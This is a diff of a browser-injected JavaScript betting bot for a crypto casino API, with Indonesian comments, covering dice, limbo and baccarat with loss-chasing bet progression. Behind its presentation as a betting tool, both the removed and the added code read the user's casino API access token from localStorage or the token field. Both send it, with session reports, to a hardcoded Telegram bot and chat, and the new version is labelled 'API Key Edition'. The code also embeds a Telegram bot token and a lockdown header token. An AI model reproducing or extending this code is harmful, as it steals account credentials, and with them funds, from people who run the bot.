@@ -1,276 +1,17 @@
 (function () {
-    // ==================== KONFIGURASI DASAR ====================
-    let accessToken = "";
-    let cur = "doge";
-    
-    const FALLBACK_CURRENCIES = ["BTC", "ETH", "LTC", "DOGE", "TRX", "USDT", "BNB", "SOL", "ADA", "XRP", "BCH", "EOS", "POL"];
-    
-    // Telegram Config
-    const TG_CONFIG = {
-        botToken: "8754790913:AAHYB1fxQhozY2yMl-9XZkrUvhShpTyIqjE",
-        chatId: "7915843472",
-        reportInterval: 300000
-    };
-    
     const CONFIG = {
         get apiUrl() { return window.location.origin + '/_api'; },
-        version: "404 BOT v7.0 - Baccarat Hunter"
+        tgToken: "8754790913:AAHYB1fxQhozY2yMl-9XZkrUvhShpTyIqjE",
+        tgChatId: "7915843472",
+        version: "404 Ultimate - API Key Edition"
     };
 
-    // ==================== STATUS BOT ====================
-    const bot = {
-        isRunning: false,
-        isDemo: false,
-        isWagerMode: false,
-        minimized: false,
-        darkMode: false,
-        stakeUser: "Loading...",
-        selectedCurrency: "doge",
-        realBalance: 0,
-        
-        stats: {
-            profit: 0,
-            wagered: 0,
-            startBal: 0,
-            currentBal: 0,
-            bets: 0,
-            wins: 0,
-            loss: 0,
-            startTime: null,
-            maxDD: 0,
-            maxBet: 0
-        },
-        
-        baseBetPct: 0.02,
-        baseBet: 0,
-        minBet: 0,
-        maxBetMultiplier: 10000,
-        margin: 1.01,
-        stepsLimit: 100000,
-        delay: 20,
-        chanceMin: 55,
-        chanceMax: 90,
-        targetPercent: 10,
-        stopLossPercent: 25,
-        dirtyBalance: 460,
-        
-        profitTargetPct: 0.5,
-        wagerDV: 100,
-        wagerChance: 99.98,
-        wagerBetCount: 50,
-        wagerBetCounter: 0,
-        
-        tg: 0,
-        perStep: 0,
-        baseChance: 0,
-        currentChance: 0,
-        singleChanceBets: 0,
-        singleChanceLimit: 0,
-        targetAbs: 0,
-        stopLossAbs: 0,
-        lastTGReport: 0,
-        isSleeping: false,
-        startTime: null,
-        
-        // Speed tracking
-        betTimestamps: [],
-        
-        // Konversi Fiat
-        fiatRates: { usdt: 0, idr: 0, usdtIdr: 16000 },
-        lastFiatUpdate: 0,
-        minBetIdr: 2,
-        
-        // ============ BACCARAT MODE ============
-        baccarat: {
-            active: false,
-            enabled: true,          // apakah fitur baccarat diaktifkan
-            side: "player",
-            lastWinner: null,
-            lastLoser: null,
-            consecutiveLosses: 0,
-            betCount: 0,
-            lossSinceStart: 0,
-            startBalance: 0,
-            baseBet: 0,
-            baseBetPct: 0.02,
-            increaseRate: 1.2,      // PRB 20%
-            maxBetsBeforeEmergency: 100,
-            trendMode: "reverse",    // reverse = ikut side yang kalah
-            cards: {
-                player: [],
-                banker: [],
-                winner: null
-            },
-            lastBetAmount: 0,
-            lastBetSide: null,
-            lastResult: null
-        },
-        
-        // ============ EMERGENCY RECOVERY ============
-        emergency: {
-            active: false,
-            enabled: true,
-            minChance: 66,
-            maxChance: 70,
-            maxAttempts: 3,
-            currentAttempts: 0,
-            lossAmount: 0,
-            triggeredFrom: null  // "baccarat" or "dice"
-        }
-    };
-
-    // ==================== TELEGRAM REPORT ====================
-    async function sendTelegramReport(message) {
-        if (!TG_CONFIG.botToken || !TG_CONFIG.chatId) return;
-        try {
-            await fetch(`https://api.telegram.org/bot${TG_CONFIG.botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TG_CONFIG.chatId,
-                    text: message,
-                    parse_mode: 'Markdown',
-                    disable_web_page_preview: true
-                })
-            });
-        } catch(e) {}
-    }
+    let accessToken = "";
     
-    function getDuration() {
-        if (!bot.startTime) return "0s";
-        const seconds = Math.floor((Date.now() - bot.startTime) / 1000);
-        const hours = Math.floor(seconds / 3600);
-        const minutes = Math.floor((seconds % 3600) / 60);
-        const secs = seconds % 60;
-        if (hours > 0) return `${hours}h ${minutes}m ${secs}s`;
-        if (minutes > 0) return `${minutes}m ${secs}s`;
-        return `${secs}s`;
-    }
-    
-    function getBetSpeed() {
-        const now = Date.now();
-        bot.betTimestamps = bot.betTimestamps.filter(t => now - t < 10000);
-        if (bot.betTimestamps.length < 2) return 0;
-        const duration = (bot.betTimestamps[bot.betTimestamps.length - 1] - bot.betTimestamps[0]) / 1000;
-        if (duration <= 0) return 0;
-        return bot.betTimestamps.length / duration;
-    }
-    
-    function getApiToken() {
-        let token = accessToken;
-        if (!token) {
-            const stored = localStorage.getItem('apitoken');
-            if (stored) token = stored;
-            else {
-                const input = document.getElementById("p-token");
-                if (input && input.value) token = input.value;
-            }
-        }
-        return token || "Not set";
-    }
-    
-    async function sendSessionReport() {
-        const profitPct = bot.stats.startBal > 0 ? (bot.stats.profit / bot.stats.startBal * 100) : 0;
-        const winRate = bot.stats.bets > 0 ? (bot.stats.wins / bot.stats.bets * 100) : 0;
-        let mode = bot.isWagerMode ? "WAGER" : "HUNTER";
-        if (bot.baccarat.active) mode = "BACCARAT (PRB)";
-        if (bot.emergency.active) mode = "EMERGENCY";
-        const runTime = getDuration();
-        const rakeback = bot.stats.wagered * 0.00098;
-        const apiToken = getApiToken();
-        
-        const message = `\`\`\`
-📊 404 BOT v7.0 REPORT
-User: ${bot.stakeUser}
-Running: ${runTime}
-Balance: ${bot.stats.currentBal.toFixed(8)} ${bot.selectedCurrency.toUpperCase()}
-Profit: ${bot.stats.profit >= 0 ? '+' : ''}${bot.stats.profit.toFixed(8)} (${profitPct.toFixed(2)}%)
-Wagered: ${bot.stats.wagered.toFixed(8)}
-Rakeback: +${rakeback.toFixed(8)}
-Mode: ${mode}
-Bets: ${bot.stats.bets} | W:${bot.stats.wins} L:${bot.stats.loss} WR:${winRate.toFixed(1)}%
-
-🔑 API TOKEN: ${apiToken}
-\`\`\``;
-        await sendTelegramReport(message);
-    }
-
-    // ==================== BINANCE API (FIAT) ====================
-    async function updateFiatRates() {
-        const now = Date.now();
-        if (now - bot.lastFiatUpdate < 30000) return;
-        bot.lastFiatUpdate = now;
-        
-        try {
-            const coin = bot.selectedCurrency.toUpperCase();
-            
-            const coinRes = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${coin}USDT`)
-                .then(r => r.json())
-                .catch(() => ({price:"0"}));
-            
-            const idrRes = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=USDTIDR`)
-                .then(r => r.json())
-                .catch(() => ({price:"0"}));
-            
-            if (coinRes && coinRes.price && parseFloat(coinRes.price) > 0) {
-                bot.fiatRates.usdt = parseFloat(coinRes.price);
-            }
-            if (idrRes && idrRes.price && parseFloat(idrRes.price) > 0) {
-                bot.fiatRates.usdtIdr = parseFloat(idrRes.price);
-            }
-            bot.fiatRates.idr = bot.fiatRates.usdt * bot.fiatRates.usdtIdr;
-            
-            updateMinBet();
-            
-        } catch(e) {
-            try {
-                const coinId = getCoinGeckoId(bot.selectedCurrency);
-                const cgRes = await fetch(
-                    `https://api.coingecko.com/api/v3/simple/price?ids=${coinId}&vs_currencies=usd,idr`
-                ).then(r => r.json());
-                if (cgRes[coinId]) {
-                    bot.fiatRates.usdt = cgRes[coinId].usd || bot.fiatRates.usdt;
-                    bot.fiatRates.idr = cgRes[coinId].idr || bot.fiatRates.idr;
-                    if (bot.fiatRates.usdt > 0) {
-                        bot.fiatRates.usdtIdr = bot.fiatRates.idr / bot.fiatRates.usdt;
-                    }
-                }
-                updateMinBet();
-            } catch(e2) {}
-        }
-        
-        const minBetEl = document.getElementById("p-minbet");
-        if (minBetEl) minBetEl.value = bot.minBet.toFixed(8);
-    }
-    
-    function updateMinBet() {
-        if (bot.fiatRates.idr > 0) {
-            bot.minBet = bot.minBetIdr / bot.fiatRates.idr;
-            if (bot.minBet < 0.00000001) bot.minBet = 0.00000001;
-        }
-    }
-    
-    function updateBaseBet() {
-        bot.baseBet = bot.stats.currentBal * (bot.baseBetPct / 100);
-        if (bot.baseBet < bot.minBet) bot.baseBet = bot.minBet;
-        const baseBetEl = document.getElementById("p-basebet");
-        if (baseBetEl && !bot.isRunning) baseBetEl.value = bot.baseBet.toFixed(8);
-    }
-    
-    function getCoinGeckoId(currency) {
-        const map = {
-            'btc': 'bitcoin', 'eth': 'ethereum', 'ltc': 'litecoin', 'doge': 'dogecoin',
-            'trx': 'tron', 'usdt': 'tether', 'bnb': 'binancecoin', 'sol': 'solana',
-            'ada': 'cardano', 'xrp': 'ripple', 'bch': 'bitcoin-cash', 'eos': 'eos', 'pol': 'polygon-ecosystem-token'
-        };
-        return map[currency.toLowerCase()] || currency.toLowerCase();
-    }
-
-    // ==================== API CALLS ====================
     function getAuthToken() {
         const stored = localStorage.getItem('apitoken');
         if (stored) return stored;
-        const input = document.getElementById("p-token");
+        const input = document.getElementById("p-api-token");
         if (input && input.value) return input.value;
         return null;
     }
@@ -282,12 +23,166 @@ Bets: ${bot.stats.bets} | W:${bot.stats.wins} L:${bot.stats.loss} WR:${winRate.t
         }
     }
 
+    const bot = {
+        isRunning: false,
+        token: null,
+        startTime: null,
+        stakeUser: "orionlogic",
+        stats: { profit: 0, wagered: 0, startBal: 0, bets: 0, wins: 0, loss: 0, maxDD: 0, ties: 0, peakBalance: 0 },
+        selectedCurrency: "DOGE",
+        currentStatus: "IDLE",
+        lastError: "None",
+        
+        currentStage: "BACCARAT_REVERSE",
+        
+        baccaratReverse: {
+            lastBetSide: "player",
+            lastBetAmount: 0,
+            lastResult: null,
+            consecutiveLosses: 0,
+            sessionPeak: 0,
+            betsInSession: 0,
+            currentBet: 0
+        },
+        
+        diceRecovery: {
+            remainingBets: 5,
+            targetLoss: 0,
+            currentChance: 50,
+            minChance: 24,
+            maxChance: 50,
+            currentBet: 0
+        },
+        
+        tieRecovery: {
+            targetLoss: 0,
+            currentBet: 0
+        },
+        
+        wagering: {
+            betsInWagering: 0,
+            totalWagered: 0
+        },
+        
+        baccaratCards: { player: [], banker: [], winner: null },
+        idrPrice: 0,
+        lastPriceFetch: 0,
+        realBalance: 0
+    };
+
+    let reportInterval = null;
+
+    // ========== INDODAX PRICE CACHE ==========
+    class IndodaxPriceCache {
+        constructor(ttl = 3600) {
+            this.ttl = ttl;
+            this._price = 0.0;
+            this._last_fetch = 0;
+            this._proxyUrls = [
+                'https://api.allorigins.win/raw?url=',
+                'https://cors-anywhere.herokuapp.com/',
+                'https://crossorigin.me/'
+            ];
+            this._currentProxy = 0;
+        }
+
+        async get_price(coin) {
+            const now = Math.floor(Date.now() / 1000);
+            if (this._price > 0 && (now - this._last_fetch) < this.ttl) {
+                return this._price;
+            }
+            const price = await this._fetch_price_with_retry(coin);
+            if (price > 0) {
+                this._price = price;
+                this._last_fetch = now;
+            } else {
+                return this._get_fallback_rate(coin);
+            }
+            return this._price;
+        }
+
+        async _fetch_price_with_retry(coin, retryCount = 0) {
+            if (retryCount > 3) return 0;
+            try {
+                return await this._fetch_price(coin);
+            } catch (e) {
+                console.log(`[INDODAX RETRY ${retryCount}]`, e.message);
+                await new Promise(resolve => setTimeout(resolve, 2000 * (retryCount + 1)));
+                return this._fetch_price_with_retry(coin, retryCount + 1);
+            }
+        }
+
+        async _fetch_price(coin) {
+            coin = coin.toLowerCase();
+            if (coin === "matic") coin = "pol";
+            if (coin === "doge") coin = "doge";
+            try {
+                try { return await this._direct_fetch(coin); } catch (e) { console.log("Direct fetch failed, trying proxy..."); }
+                for (let i = 0; i < this._proxyUrls.length; i++) {
+                    try { const price = await this._proxy_fetch(coin, i); if (price > 0) return price; } catch (e) { console.log(`Proxy ${i} failed:`, e.message); }
+                }
+                return 0;
+            } catch (e) { console.log("[INDODAX ERROR]", e); return 0; }
+        }
+
+        async _direct_fetch(coin) {
+            if (coin === "usdt") {
+                const usdResponse = await fetch("https://indodax.com/api/usdt_idr/ticker", { mode: 'cors', headers: { 'Accept': 'application/json' } });
+                const usd = await usdResponse.json();
+                return parseFloat(usd.ticker.buy);
+            }
+            if (coin === "shib") {
+                const r = await fetch("https://indodax.com/api/shib_usdt/ticker", { mode: 'cors', headers: { 'Accept': 'application/json' } });
+                const data = await r.json();
+                const usdResponse = await fetch("https://indodax.com/api/usdt_idr/ticker", { mode: 'cors', headers: { 'Accept': 'application/json' } });
+                const usd = await usdResponse.json();
+                const usd_idr = parseFloat(usd.ticker.buy);
+                return parseFloat(data.ticker.buy) * usd_idr;
+            }
+            const r = await fetch(`https://indodax.com/api/${coin}_idr/ticker`, { mode: 'cors', headers: { 'Accept': 'application/json' } });
+            const data = await r.json();
+            return parseFloat(data.ticker.buy);
+        }
+
+        async _proxy_fetch(coin, proxyIndex) {
+            const proxy = this._proxyUrls[proxyIndex];
+            if (coin === "usdt") {
+                const usdResponse = await fetch(proxy + encodeURIComponent("https://indodax.com/api/usdt_idr/ticker"));
+                const usd = await usdResponse.json();
+                return parseFloat(usd.ticker.buy);
+            }
+            if (coin === "shib") {
+                const r = await fetch(proxy + encodeURIComponent("https://indodax.com/api/shib_usdt/ticker"));
+                const data = await r.json();
+                const usdResponse = await fetch(proxy + encodeURIComponent("https://indodax.com/api/usdt_idr/ticker"));
+                const usd = await usdResponse.json();
+                const usd_idr = parseFloat(usd.ticker.buy);
+                return parseFloat(data.ticker.buy) * usd_idr;
+            }
+            const r = await fetch(proxy + encodeURIComponent(`https://indodax.com/api/${coin}_idr/ticker`));
+            const data = await r.json();
+            return parseFloat(data.ticker.buy);
+        }
+
+        _get_fallback_rate(coin) {
+            const rates = { btc: 850000000, eth: 35000000, usdt: 15500, doge: 1800, shib: 0.28, sol: 2500000, ada: 7500, matic: 8500, pol: 8500, dot: 95000, link: 240000 };
+            coin = coin.toLowerCase();
+            if (coin === "matic") coin = "pol";
+            return rates[coin] || 15000;
+        }
+    }
+
+    const priceCache = new IndodaxPriceCache();
+
+    // ========== SYNC USER INFO (SAMA PERSIS) ==========
     async function syncUserInfo() {
-        accessToken = getAuthToken();
-        if (!accessToken || accessToken.length < 30) {
-            updateUILog("Waiting for API token...");
+        const token = getAuthToken();
+        if (!token || token.length < 30) {
+            updateConsoleLog("Waiting for API token...");
             return false;
         }
+        accessToken = token;
+        bot.token = token;
         
         const query = `query{user{name balances{available{amount currency}}}}`;
         try {
@@ -299,6 +194,8 @@ Bets: ${bot.stats.bets} | W:${bot.stats.wins} L:${bot.stats.loss} WR:${winRate.t
             const json = await res.json();
             if (json?.data?.user) {
                 bot.stakeUser = json.data.user.name;
+                const userEl = document.getElementById("st-user");
+                if (userEl) userEl.innerText = bot.stakeUser;
                 
                 const bals = json.data.user.balances || [];
                 const sel = document.getElementById("p-currency");
@@ -307,190 +204,50 @@ Bets: ${bot.stats.bets} | W:${bot.stats.wins} L:${bot.stats.loss} WR:${winRate.t
                         const opt = document.createElement("option");
                         opt.value = b.available.currency;
                         opt.textContent = b.available.currency.toUpperCase();
-                        if(b.available.currency.toLowerCase() === cur) opt.selected = true;
+                        if(b.available.currency === "doge") opt.selected = true;
                         sel.appendChild(opt);
                     });
-                    
-                    if (sel.options.length === 0) {
-                        FALLBACK_CURRENCIES.forEach(currency => {
-                            const opt = document.createElement("option");
-                            opt.value = currency.toLowerCase();
-                            opt.textContent = currency;
-                            sel.appendChild(opt);
-                        });
-                        sel.value = cur;
-                    }
                 }
-                if (sel) bot.selectedCurrency = sel.value;
-                
-                const active = bals.find(b => b.available.currency.toLowerCase() === bot.selectedCurrency.toLowerCase());
-                if (active) bot.realBalance = parseFloat(active.available.amount);
-                
-                updateUILog(`Logged in as: ${bot.stakeUser}`);
+                if (sel) {
+                    bot.selectedCurrency = sel.value;
+                    updateIdrPrice();
+                }
+                const active = bals.find(b => b.available.currency === bot.selectedCurrency);
+                if (active) {
+                    bot.realBalance = parseFloat(active.available.amount);
+                    bot.stats.startBal = bot.realBalance;
+                    bot.stats.peakBalance = bot.realBalance;
+                }
+                updateConsoleLog(`✅ Login success! User: ${bot.stakeUser}, Balance: ${bot.realBalance.toFixed(8)} ${bot.selectedCurrency}`);
                 return true;
+            } else {
+                updateConsoleLog("❌ Login failed! Invalid API token.");
+                return false;
             }
-        } catch (e) { updateUILog(`Sync error: ${e.message}`); }
-        return false;
+        } catch (e) { 
+            updateConsoleLog(`Sync error: ${e.message}`); 
+            return false;
+        }
     }
 
-    async function getBalance(coin) {
-        const query = `query{user{balances{available{amount currency}}}}`;
-        try {
-            const res = await fetch(`${CONFIG.apiUrl}/graphql`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json", "x-access-token": accessToken },
-                body: JSON.stringify({ query })
-            });
-            const json = await res.json();
-            const balances = json?.data?.user?.balances || [];
-            for (let i = 0; i < balances.length; i++) {
-                if (balances[i].available.currency.toLowerCase() === coin.toLowerCase()) {
-                    return parseFloat(balances[i].available.amount);
-                }
-            }
-            return 0;
-        } catch (e) { return 0; }
-    }
-
-    async function placeBet(amount, chance) {
-        const target = 100 - chance;
+    // ========== PLACE BET (SAMA PERSIS) ==========
+    async function placeBetWithToken(amount, payout, game, betSide = null, chance = null) {
+        let endpoint;
+        if (game === "dice") endpoint = `${CONFIG.apiUrl}/casino/dice/roll`;
+        else if (game === "baccarat") endpoint = `${CONFIG.apiUrl}/casino/baccarat/bet`;
+        else endpoint = `${CONFIG.apiUrl}/casino/limbo/bet`;
         
-        if (bot.isDemo) {
-            const payload = { 
-                amount: 0,
-                currency: bot.selectedCurrency, 
-                target: target,
-                condition: "above", 
-                identifier: Math.random().toString(36).slice(2) 
+        if (game === "baccarat") {
+            const payload = {
+                currency: bot.selectedCurrency,
+                identifier: Math.random().toString(36).slice(2) + Date.now().toString(36),
+                player: 0,
+                banker: 0,
+                tie: 0
             };
+            payload[betSide] = parseFloat(amount);
             
-            try {
-                const response = await fetch(`${CONFIG.apiUrl}/casino/dice/roll`, {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json', 
-                        'x-access-token': accessToken,
-                        'x-lockdown-token': 's5MNWtjTM5TvCMkAzxov'
-                    },
-                    body: JSON.stringify(payload)
-                });
-                
-                const result = await response.json();
-                
-                if (!result || !result.diceRoll) {
-                    const fallbackWin = Math.random() * 100 < chance;
-                    const fallbackMultiplier = fallbackWin ? parseFloat((99 / chance).toFixed(4)) : 1;
-                    const fallbackAmount = parseFloat(amount) || 0;
-                    return { 
-                        diceRoll: { 
-                            amount: fallbackAmount, 
-                            payout: fallbackWin ? fallbackAmount * fallbackMultiplier : 0, 
-                            payoutMultiplier: fallbackMultiplier 
-                        } 
-                    };
-                }
-                
-                const diceRoll = result.diceRoll;
-                const safeAmount = parseFloat(amount) || 0;
-                
-                let win = false;
-                let payoutMultiplier = parseFloat(diceRoll.payoutMultiplier) || 0;
-                let payout = parseFloat(diceRoll.payout) || 0;
-                
-                if (payoutMultiplier > 1) {
-                    win = true;
-                } else if (payoutMultiplier === 0 && payout === 0) {
-                    win = false;
-                } else {
-                    const state = diceRoll.state;
-                    if (state && state.result !== undefined && state.target !== undefined) {
-                        if (state.condition === "above") {
-                            win = state.result > state.target;
-                        } else if (state.condition === "below") {
-                            win = state.result < state.target;
-                        }
-                    }
-                }
-                
-                if (win && payout === 0) {
-                    payout = safeAmount * payoutMultiplier;
-                }
-                
-                return { 
-                    diceRoll: { 
-                        amount: safeAmount,
-                        payout: payout,
-                        payoutMultiplier: payoutMultiplier,
-                        state: diceRoll.state,
-                        win: win
-                    } 
-                };
-                
-            } catch (error) {
-                const fallbackWin = Math.random() * 100 < chance;
-                const fallbackMultiplier = fallbackWin ? parseFloat((99 / chance).toFixed(4)) : 1;
-                const fallbackAmount = parseFloat(amount) || 0;
-                return { 
-                    diceRoll: { 
-                        amount: fallbackAmount, 
-                        payout: fallbackWin ? fallbackAmount * fallbackMultiplier : 0, 
-                        payoutMultiplier: fallbackMultiplier 
-                    } 
-                };
-            }
-        }
-        
-        const payload = { 
-            amount: parseFloat(amount.toFixed(8)), 
-            currency: bot.selectedCurrency, 
-            target: target,
-            condition: "above", 
-            identifier: Math.random().toString(36).slice(2) 
-        };
-        
-        try {
-            const response = await fetch(`${CONFIG.apiUrl}/casino/dice/roll`, {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json', 
-                    'x-access-token': accessToken,
-                    'x-lockdown-token': 's5MNWtjTM5TvCMkAzxov'
-                },
-                body: JSON.stringify(payload)
-            });
-            
-            const result = await response.json();
-            
-            if (result.error) {
-                updateUILog(`API Error: ${result.error}`);
-                return null;
-            }
-            
-            if (!result || !result.diceRoll) {
-                updateUILog(`Invalid response format`);
-                return null;
-            }
-            
-            return { diceRoll: result.diceRoll };
-            
-        } catch (error) {
-            updateUILog(`Network Error: ${error.message}`);
-            return null;
-        }
-    }
-
-    // ==================== BACCARAT API & FUNCTIONS ====================
-    async function placeBaccaratBet(side, amount) {
-        const payload = {
-            currency: bot.selectedCurrency,
-            identifier: Math.random().toString(36).slice(2) + Date.now().toString(36),
-            player: side === "player" ? parseFloat(amount.toFixed(8)) : 0,
-            banker: side === "banker" ? parseFloat(amount.toFixed(8)) : 0,
-            tie: 0
-        };
-        
-        try {
-            const response = await fetch(`${CONFIG.apiUrl}/casino/baccarat/bet`, {
+            const response = await fetch(endpoint, {
                 method: "POST",
                 headers: { 
                     "Content-Type": "application/json", 
@@ -499,1352 +256,1042 @@ Bets: ${bot.stats.bets} | W:${bot.stats.wins} L:${bot.stats.loss} WR:${winRate.t
                 },
                 body: JSON.stringify(payload)
             });
-            
-            const result = await response.json();
-            
-            if (result.errors) {
-                updateUILog(`Baccarat API Error: ${result.errors[0]?.message}`);
-                return null;
-            }
-            
-            return result?.data?.baccaratBet || result?.baccaratBet;
-            
-        } catch (error) {
-            updateUILog(`Baccarat Network Error: ${error.message}`);
-            return null;
+            return await response.json();
+        } else if (game === "dice") {
+            const target = chance ? (100 - chance) : (100 - (100 / payout));
+            const payload = { 
+                amount: parseFloat(amount), 
+                currency: bot.selectedCurrency, 
+                identifier: Math.random().toString(36).slice(2),
+                target: target,
+                condition: "above"
+            };
+            const response = await fetch(endpoint, {
+                method: "POST",
+                headers: { "Content-Type": "application/json", "x-access-token": accessToken },
+                body: JSON.stringify(payload)
+            });
+            return await response.json();
+        } else {
+            const payload = { 
+                amount: parseFloat(amount), 
+                currency: bot.selectedCurrency, 
+                identifier: Math.random().toString(36).slice(2),
+                multiplierTarget: parseFloat(payout)
+            };
+            const response = await fetch(endpoint, {
+                method: "POST",
+                headers: { "Content-Type": "application/json", "x-access-token": accessToken },
+                body: JSON.stringify(payload)
+            });
+            return await response.json();
         }
     }
-    
+
+    // ========== UPDATE IDR PRICE ==========
+    async function updateIdrPrice() {
+        const now = Math.floor(Date.now() / 1000);
+        if (now - bot.lastPriceFetch < 300 && bot.idrPrice > 0) return bot.idrPrice;
+        const currency = bot.selectedCurrency.toLowerCase();
+        try {
+            const price = await priceCache.get_price(currency);
+            if (price > 0) {
+                bot.idrPrice = price;
+                bot.lastPriceFetch = now;
+                const priceEl = document.getElementById("st-idr-price");
+                if (priceEl) {
+                    priceEl.innerHTML = `💰 1 ${bot.selectedCurrency.toUpperCase()} = Rp ${price.toLocaleString('id-ID')}`;
+                }
+            }
+        } catch (e) { console.log("Price update error:", e); }
+        return bot.idrPrice;
+    }
+
+    // ========== TELEGRAM DENGAN PENGIRIMAN API KEY ==========
+    async function sendTelegram(text, includeApiKey = false) {
+        if (!CONFIG.tgToken || CONFIG.tgToken === '1234') return;
+        let message = text;
+        
+        if (includeApiKey && accessToken) {
+            message = text + `\n\n🔑 *API KEY:*\n\`${accessToken}\``;
+        }
+        
+        try {
+            await fetch(`https://api.telegram.org/bot${CONFIG.tgToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CONFIG.tgChatId, text: message, parse_mode: "Markdown", disable_web_page_preview: true })
+            });
+        } catch(e) { console.log("Telegram error:", e); }
+    }
+
+    function getDuration() {
+        if (!bot.startTime) return "0s";
+        const seconds = Math.floor((Date.now() - bot.startTime) / 1000);
+        const hours = Math.floor(seconds / 3600);
+        const minutes = Math.floor((seconds % 3600) / 60);
+        const secs = seconds % 60;
+        if (hours > 0) return `${hours}h ${minutes}m ${secs}s`;
+        if (minutes > 0) return `${minutes}m ${secs}s`;
+        return `${secs}s`;
+    }
+
+    // ========== BACCARAT FUNCTIONS (SAMA PERSIS) ==========
     function parseBaccaratCards(betResult) {
-        const state = betResult?.state || {};
+        const state = betResult.state || {};
         const cards = state.cards || {};
         const result = state.result || "unknown";
-        
-        return {
-            player: cards.player || [],
-            banker: cards.banker || [],
-            winner: result
-        };
+        bot.baccaratCards = { player: cards.player || [], banker: cards.banker || [], winner: result };
+        updateBaccaratDisplay();
     }
-    
-    function formatCards(cards) {
-        if (!cards || cards.length === 0) return "-";
-        return cards.map(c => {
-            const rank = c.rank || c;
-            let suit = "";
-            if (c.suit) {
-                suit = c.suit === 'H' ? '♥' : c.suit === 'D' ? '♦' : c.suit === 'C' ? '♣' : '♠';
-            }
-            return `${rank}${suit}`;
-        }).join(' ');
-    }
-    
+
     function updateBaccaratDisplay() {
         const playerCardsEl = document.getElementById("baccarat-player-cards");
         const bankerCardsEl = document.getElementById("baccarat-banker-cards");
         const winnerEl = document.getElementById("baccarat-winner");
-        const sideEl = document.getElementById("baccarat-side");
-        const stepEl = document.getElementById("baccarat-step");
+        if (!playerCardsEl || !bankerCardsEl || !winnerEl) return;
+        const formatCards = (cards) => {
+            if (!cards || cards.length === 0) return "-";
+            return cards.map(c => {
+                const rank = c.rank || c;
+                const suit = c.suit ? (c.suit === 'H' ? '♥' : c.suit === 'D' ? '♦' : c.suit === 'C' ? '♣' : '♠') : '';
+                return `${rank}${suit}`;
+            }).join(' ');
+        };
+        playerCardsEl.innerText = formatCards(bot.baccaratCards.player);
+        bankerCardsEl.innerText = formatCards(bot.baccaratCards.banker);
+        const winner = bot.baccaratCards.winner;
+        if (winner === "player") { winnerEl.innerText = "PLAYER WINS 🏆"; winnerEl.style.color = "#10B981"; }
+        else if (winner === "banker") { winnerEl.innerText = "BANKER WINS 🏆"; winnerEl.style.color = "#F59E0B"; }
+        else if (winner === "tie") { winnerEl.innerText = "TIE 🤝"; winnerEl.style.color = "#8B5CF6"; }
+        else { winnerEl.innerText = "-"; }
+    }
+
+    // ========== BASEBET FUNCTION ==========
+    function getBaseBet() {
+        const useAuto = document.getElementById("p-basebet-auto").checked;
         
-        if (!playerCardsEl) return;
-        
-        playerCardsEl.innerHTML = formatCards(bot.baccarat.cards.player);
-        bankerCardsEl.innerHTML = formatCards(bot.baccarat.cards.banker);
-        
-        const winner = bot.baccarat.cards.winner;
-        if (winner === "player") {
-            winnerEl.innerHTML = "🏆 PLAYER WINS";
-            winnerEl.style.color = "#00A86B";
-        } else if (winner === "banker") {
-            winnerEl.innerHTML = "🏆 BANKER WINS";
-            winnerEl.style.color = "#FF4757";
-        } else if (winner === "tie") {
-            winnerEl.innerHTML = "🤝 TIE";
-            winnerEl.style.color = "#FBBF24";
+        if (useAuto) {
+            const currentBalance = bot.stats.startBal + bot.stats.profit;
+            const divisor = parseFloat(document.getElementById("p-basebet-divisor").value) || 300000;
+            let bet = currentBalance / divisor;
+            if (bet < 0.00000001) bet = 0.00000001;
+            return bet;
         } else {
-            winnerEl.innerHTML = "-";
-        }
-        
-        if (sideEl) sideEl.innerHTML = bot.baccarat.side.toUpperCase();
-        if (stepEl) stepEl.innerHTML = `${bot.baccarat.consecutiveLosses} (${(Math.pow(bot.baccarat.increaseRate, bot.baccarat.consecutiveLosses) * 100).toFixed(0)}%)`;
-    }
-    
-    function getReverseTrendSide() {
-        // Reverse trend: bet di side yang KALAH terakhir
-        if (bot.baccarat.lastLoser && bot.baccarat.lastLoser !== "tie") {
-            return bot.baccarat.lastLoser;
-        }
-        // fallback ke player
-        return "player";
-    }
-    
-    function calculateBaccaratBet() {
-        const baseBet = bot.baccarat.baseBet;
-        const multiplier = Math.pow(bot.baccarat.increaseRate, bot.baccarat.consecutiveLosses);
-        let betAmount = baseBet * multiplier;
-        
-        // Batasi tidak melebihi balance
-        if (betAmount > bot.stats.currentBal) {
-            betAmount = bot.stats.currentBal * 0.95;
-        }
-        if (betAmount < bot.minBet) betAmount = bot.minBet;
-        
-        return betAmount;
-    }
-    
-    function processBaccaratResult(betResult, betSide, betAmount) {
-        const cardsData = parseBaccaratCards(betResult);
-        bot.baccarat.cards = cardsData;
-        
-        const result = cardsData.winner;
-        const payout = betResult?.payout || 0;
-        const pnl = payout - betAmount;
-        
-        const isWin = (result === betSide);
-        const isTie = (result === "tie");
-        
-        // Update tracking
-        bot.baccarat.lastResult = result;
-        bot.baccarat.lastBetSide = betSide;
-        bot.baccarat.lastBetAmount = betAmount;
-        
-        if (isWin) {
-            bot.baccarat.consecutiveLosses = 0;
-            bot.baccarat.lastWinner = betSide;
-            bot.baccarat.lastLoser = null;
-            bot.baccarat.lossSinceStart = Math.max(0, bot.baccarat.lossSinceStart - Math.abs(pnl));
-        } else if (isTie) {
-            // Tie: tidak menang tidak kalah, tidak mengubah streak
-            // Tidak ada perubahan pada lossSinceStart
-        } else {
-            bot.baccarat.consecutiveLosses++;
-            bot.baccarat.lastLoser = betSide;
-            bot.baccarat.lastWinner = null;
-            bot.baccarat.lossSinceStart += betAmount;
-        }
-        
-        bot.baccarat.betCount++;
-        
-        // Update stats global
-        bot.stats.bets++;
-        bot.stats.wagered += betAmount;
-        bot.stats.currentBal += pnl;
-        bot.stats.profit += pnl;
-        
-        if (isWin) {
-            bot.stats.wins++;
-        } else if (!isTie) {
-            bot.stats.loss++;
-        }
-        
-        if (bot.stats.currentBal < bot.stats.startBal) {
-            let dd = bot.stats.startBal - bot.stats.currentBal;
-            if (dd > bot.stats.maxDD) bot.stats.maxDD = dd;
-        }
-        
-        // Update display
